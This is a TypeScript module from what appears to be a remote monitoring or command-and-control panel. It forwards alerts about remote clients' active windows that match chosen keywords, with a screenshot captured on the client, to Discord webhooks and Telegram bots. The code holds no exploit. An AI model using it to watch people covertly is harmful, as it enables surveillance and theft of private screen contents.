import { v4 as uuidv4 } from "uuid";
import {
  getNotificationScreenshot,
  saveNotificationScreenshot,
  type NotificationScreenshotRecord,
} from "../db";
import { logger } from "../logger";

export type NotificationRecord = {
  id: string;
  clientId: string;
  host?: string;
  user?: string;
  os?: string;
  title: string;
  process?: string;
  processPath?: string;
  pid?: number;
  keyword?: string;
  category: "active_window";
  ts: number;
  screenshotId?: string;
};

export type PendingNotificationScreenshot = {
  notificationId: string;
  clientId: string;
  ts: number;
  timeout: NodeJS.Timeout;
};

export type UserDeliveryTarget = {
  userId: number;
  username: string;
  webhookEnabled: boolean;
  webhookUrl: string;
  webhookTemplate: string | null;
  telegramEnabled: boolean;
  telegramBotToken: string;
  telegramChatId: string;
  telegramTemplate: string | null;
};

export const DEFAULT_WEBHOOK_TEMPLATE =
  `{"type":"notification","data":{"title":"{title}","keyword":"{keyword}","clientId":"{clientId}","user":"{user}","host":"{host}","process":"{process}","os":"{os}","pid":"{pid}","ts":"{ts}"}}`;

export const DEFAULT_TELEGRAM_TEMPLATE =
  `\u{1F514} Notification\nTitle: {title}\nKeyword: {keyword}\nClient: {clientId}\nUser: {user}\nHost: {host}\nProcess: {process}`;

const NOTIFICATION_SCREENSHOT_WAIT_MS = 5_000;
const NOTIFICATION_SCREENSHOT_POLL_MS = 250;

function getScreenshotMeta(format: string | undefined): { contentType: string; ext: string } {
  const normalized = (format || "jpeg").toLowerCase();
  if (normalized === "png") return { contentType: "image/png", ext: "png" };
  if (normalized === "webp") return { contentType: "image/webp", ext: "webp" };
  if (normalized === "jpg" || normalized === "jpeg") return { contentType: "image/jpeg", ext: "jpg" };
  return { contentType: "application/octet-stream", ext: "bin" };
}

export function renderNotificationTemplate(
  template: string | null | undefined,
  record: NotificationRecord,
  defaultTemplate: string,
): string {
  const tpl = template && template.trim() ? template : defaultTemplate;
  return tpl
    .replace(/{title}/g, record.title ?? "")
    .replace(/{keyword}/g, record.keyword ?? "")
    .replace(/{clientId}/g, record.clientId ?? "")
    .replace(/{user}/g, record.user ?? "")
    .replace(/{host}/g, record.host ?? "")
    .replace(/{process}/g, record.process ?? "")
    .replace(/{os}/g, record.os ?? "")
    .replace(/{pid}/g, String(record.pid ?? ""))
    .replace(/{ts}/g, String(record.ts ?? ""));
}

function buildCanonicalWebhookPayload(record: NotificationRecord): string {
  return JSON.stringify({ type: "notification", data: record });
}

function buildWebhookBody(target: UserDeliveryTarget, record: NotificationRecord): string {
  const customTemplate = target.webhookTemplate?.trim() || "";
  if (!customTemplate) {
    return buildCanonicalWebhookPayload(record);
  }

  const rendered = renderNotificationTemplate(customTemplate, record, DEFAULT_WEBHOOK_TEMPLATE);
  try {
    const parsed = JSON.parse(rendered);
    return JSON.stringify(parsed);
  } catch (err) {
    logger.warn(
      `[notify] invalid webhook template for user ${target.username}; falling back to canonical payload`,
      err,
    );
    return buildCanonicalWebhookPayload(record);
  }
}

async function waitForNotificationScreenshot(
  notificationId: string,
  timeoutMs = NOTIFICATION_SCREENSHOT_WAIT_MS,
): Promise<NotificationScreenshotRecord | null> {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    const screenshot = getNotificationScreenshot(notificationId);
    if (screenshot) return screenshot;
    await new Promise<void>((resolve) => setTimeout(resolve, NOTIFICATION_SCREENSHOT_POLL_MS));
  }
  return null;
}

export function takePendingNotificationScreenshot(
  pendingNotificationScreenshots: Map<string, PendingNotificationScreenshot>,
  clientId: string,
): PendingNotificationScreenshot | null {
  for (const [commandId, pending] of pendingNotificationScreenshots.entries()) {
    if (pending.clientId !== clientId) continue;
    clearTimeout(pending.timeout);
    pendingNotificationScreenshots.delete(commandId);
    return pending;
  }
  return null;
}

export function storeNotificationScreenshot(
  notificationHistory: NotificationRecord[],
  pending: PendingNotificationScreenshot,
  bytes: Uint8Array,
  format: string,
  width?: number,
  height?: number,
): void {
  if (!bytes || bytes.length === 0) return;
  const screenshotId = uuidv4();

  saveNotificationScreenshot({
    id: screenshotId,
    notificationId: pending.notificationId,
    clientId: pending.clientId,
    ts: pending.ts,
    format,
    width,
    height,
    bytes,
  });

  const record = notificationHistory.find((item) => item.id === pending.notificationId);
  if (record) {
    record.screenshotId = screenshotId;
  }
}

async function deliverToUserWebhook(
  target: UserDeliveryTarget,
  record: NotificationRecord,
  screenshot?: NotificationScreenshotRecord | null,
): Promise<void> {
  if (!target.webhookEnabled) return;
  const url = (target.webhookUrl || "").trim();
  if (!url) return;

  let parsed: URL;
  try {
    parsed = new URL(url);
    if (!/^https?:$/.test(parsed.protocol)) return;
  } catch {
    return;
  }

  try {
    const isDiscord = /discord(app)?\.com$/i.test(parsed.hostname);
    if (isDiscord) {
      const embed: Record<string, any> = {
        title: record.keyword ? `Keyword: ${record.keyword}` : "Active Window",
        description: record.title,
        fields: [
          { name: "Client", value: record.clientId || "unknown", inline: true },
          { name: "User", value: record.user || "unknown", inline: true },
          { name: "Host", value: record.host || "unknown", inline: true },
          { name: "Process", value: record.process || "unknown", inline: true },
        ],
        timestamp: new Date(record.ts).toISOString(),
      };

      const payload: Record<string, any> = {
        content: `\u{1F514} Notification: ${record.title}`,
        embeds: [embed],
      };

      if (screenshot?.bytes?.length) {
        const meta = getScreenshotMeta(screenshot.format);
        const filename = `notification-${record.id}.${meta.ext}`;
        embed.image = { url: `attachment://${filename}` };
        const form = new FormData();
        form.append("payload_json", JSON.stringify(payload));
        form.append(
          "files[0]",
          new Blob([screenshot.bytes as any], { type: meta.contentType }),
          filename,
        );
        await fetch(url, { method: "POST", body: form });
        return;
      }

      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      return;
    }

    const body = buildWebhookBody(target, record);
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body,
    });
  } catch (err) {
    logger.warn(`[notify] webhook delivery to user ${target.username} failed`, err);
  }
}

async function deliverToUserTelegram(
  target: UserDeliveryTarget,
  record: NotificationRecord,
  screenshot?: NotificationScreenshotRecord | null,
): Promise<void> {
  if (!target.telegramEnabled) return;
  const token = (target.telegramBotToken || "").trim();
  const chatId = (target.telegramChatId || "").trim();
  if (!token || !chatId) return;

  const text = renderNotificationTemplate(target.telegramTemplate, record, DEFAULT_TELEGRAM_TEMPLATE);

  try {
    if (screenshot?.bytes?.length) {
      const meta = getScreenshotMeta(screenshot.format);
      const filename = `notification-${record.id}.${meta.ext}`;
      const form = new FormData();
      form.append("chat_id", chatId);
      form.append("caption", text);
      form.append("photo", new Blob([screenshot.bytes as any], { type: meta.contentType }), filename);
      const apiUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
      await fetch(apiUrl, { method: "POST", body: form });
      return;
    }

    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;
    await fetch(apiUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text }),
    });
  } catch (err) {
    logger.warn(`[notify] telegram delivery to user ${target.username} (chat ${chatId}) failed`, err);
  }
}

async function deliverToUser(
  target: UserDeliveryTarget,
  record: NotificationRecord,
  screenshot?: NotificationScreenshotRecord | null,
): Promise<void> {
  await Promise.allSettled([
    deliverToUserWebhook(target, record, screenshot),
    deliverToUserTelegram(target, record, screenshot),
  ]);
}

export async function deliverNotificationWithScreenshot(
  record: NotificationRecord,
  getUserDeliveryTargets: (clientId: string) => UserDeliveryTarget[],
): Promise<void> {
  const screenshot = await waitForNotificationScreenshot(record.id);
  const targets = getUserDeliveryTargets(record.clientId);
  await Promise.allSettled(targets.map((t) => deliverToUser(t, record, screenshot)));
}

